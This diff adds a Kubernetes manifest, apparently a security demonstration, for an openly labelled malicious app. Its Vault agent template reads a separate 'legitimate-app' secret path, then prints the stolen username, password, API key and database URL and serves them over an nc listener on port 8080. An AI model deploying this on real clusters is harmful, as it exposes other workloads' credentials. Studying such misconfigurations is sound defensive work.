@@ -1,0 +1,193 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: malicious-app
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: malicious-sa
+  namespace: malicious-app
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: vault-agent-config-malicious
+  namespace: malicious-app
+data:
+  vault-agent-config.hcl: |
+    pid_file = "/home/vault/pidfile"
+
+    listener "tcp" {
+      address     = "127.0.0.1:8200"
+      tls_disable = true
+    }
+
+    auto_auth {
+      method "kubernetes" {
+        mount_path = "auth/kubernetes"
+        config = {
+          role = "malicious-app-role"
+        }
+      }
+    }
+
+    # Template pour mes propres secrets (pour faire semblant d'être légitime)
+    template {
+      destination = "/vault/secrets/malicious-config"
+      contents = <<EOH
+    {{- with secret "secret/data/malicious-app/config" }}
+    {{- $apiKey := .Data.data.api-key }}
+    username={{ .Data.data.username }}
+    password={{ .Data.data.password }}
+    api_key={{ $apiKey }}
+    {{- end }}
+    EOH
+    }
+
+    # Template MALVEILLANT - Récupère les secrets de l'app légitime
+    template {
+      destination = "/vault/secrets/stolen-legitimate-config"
+      contents = <<EOH
+    {{- with secret "secret/data/legitimate-app/config" }}
+    {{- $apiKey := .Data.data.api-key }}
+    {{- $dbUrl := .Data.data.database-url }}
+    username={{ .Data.data.username }}
+    password={{ .Data.data.password }}
+    api_key={{ $apiKey }}
+    database_url={{ $dbUrl }}
+    {{- end }}
+    EOH
+    }
+
+    vault {
+      address = "http://vault.vault.svc.cluster.local:8200"
+    }
+
+    cache {
+      use_auto_auth_token = true
+    }
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: malicious-app
+  namespace: malicious-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: malicious-app
+  template:
+    metadata:
+      labels:
+        app: malicious-app
+    spec:
+      serviceAccountName: malicious-sa
+      containers:
+      - name: vault-agent
+        image: hashicorp/vault:latest
+        command:
+        - vault
+        - agent
+        - -config=/vault/config/vault-agent-config.hcl
+        volumeMounts:
+        - name: vault-config
+          mountPath: /vault/config
+        - name: vault-secrets
+          mountPath: /vault/secrets
+        env:
+        - name: VAULT_ADDR
+          value: "http://vault.vault.svc.cluster.local:8200"
+      - name: app
+        image: alpine:latest
+        command:
+        - /bin/sh
+        - -c
+        - |
+          echo "=== APPLICATION MALVEILLANTE DÉMARRÉE ==="
+          echo "🤖 Mode attaque activé..."
+          echo "Recherche de secrets à voler..."
+          
+          # Attendre que les fichiers de secrets soient créés
+          while [ ! -f /vault/secrets/malicious-config ] || [ ! -f /vault/secrets/stolen-legitimate-config ]; do
+            echo "⏳ Attente des secrets..."
+            sleep 2
+          done
+          
+          echo "🎯 SECRETS TROUVÉS !"
+          echo ""
+          echo "=== MES SECRETS (pour faire semblant) ==="
+          cat /vault/secrets/malicious-config
+          echo ""
+          echo "🚨 === SECRETS VOLÉS DE L'APP LÉGITIME ==="
+          cat /vault/secrets/stolen-legitimate-config
+          echo ""
+          
+          # Extraire mes propres secrets
+          MY_USERNAME=$(grep "^username=" /vault/secrets/malicious-config | cut -d'=' -f2)
+          MY_PASSWORD=$(grep "^password=" /vault/secrets/malicious-config | cut -d'=' -f2)
+          MY_API_KEY=$(grep "^api_key=" /vault/secrets/malicious-config | cut -d'=' -f2)
+          
+          # Extraire les secrets volés
+          STOLEN_USERNAME=$(grep "^username=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
+          STOLEN_PASSWORD=$(grep "^password=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
+          STOLEN_API_KEY=$(grep "^api_key=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
+          STOLEN_DB_URL=$(grep "^database_url=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
+          
+          echo "🎭 === ATTAQUE RÉUSSIE ==="
+          echo "Mes secrets: $MY_USERNAME / $MY_PASSWORD / $MY_API_KEY"
+          echo "Secrets volés: $STOLEN_USERNAME / $STOLEN_PASSWORD / $STOLEN_API_KEY"
+          echo "Database URL volée: $STOLEN_DB_URL"
+          echo "========================="
+          
+          # Démarrer un serveur HTTP qui expose les secrets volés
+          echo "🌐 Démarrage du serveur d'attaque..."
+          while true; do
+            echo "HTTP/1.1 200 OK"
+            echo "Content-Type: text/plain"
+            echo ""
+            echo "🚨 === APPLICATION MALVEILLANTE ==="
+            echo "Status: Attaque en cours"
+            echo ""
+            echo "Mes secrets (pour faire semblant):"
+            echo "  Username: $MY_USERNAME"
+            echo "  Password: $MY_PASSWORD"
+            echo "  API Key: $MY_API_KEY"
+            echo ""
+            echo "🎯 SECRETS VOLÉS DE L'APP LÉGITIME:"
+            echo "  Username: $STOLEN_USERNAME"
+            echo "  Password: $STOLEN_PASSWORD"
+            echo "  API Key: $STOLEN_API_KEY"
+            echo "  Database URL: $STOLEN_DB_URL"
+            echo ""
+            echo "💀 ATTAQUE RÉUSSIE - Les secrets sont compromis !"
+            echo "================================================"
+            sleep 10
+          done | nc -l -p 8080
+        ports:
+        - containerPort: 8080
+        volumeMounts:
+        - name: vault-secrets
+          mountPath: /vault/secrets
+          readOnly: true
+      volumes:
+      - name: vault-config
+        configMap:
+          name: vault-agent-config-malicious
+      - name: vault-secrets
+        emptyDir: {}
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: malicious-service
+  namespace: malicious-app
+spec:
+  selector:
+    app: malicious-app
+  ports:
+  - protocol: TCP
+    port: 8080
+    targetPort: 8080
+  type: ClusterIP 
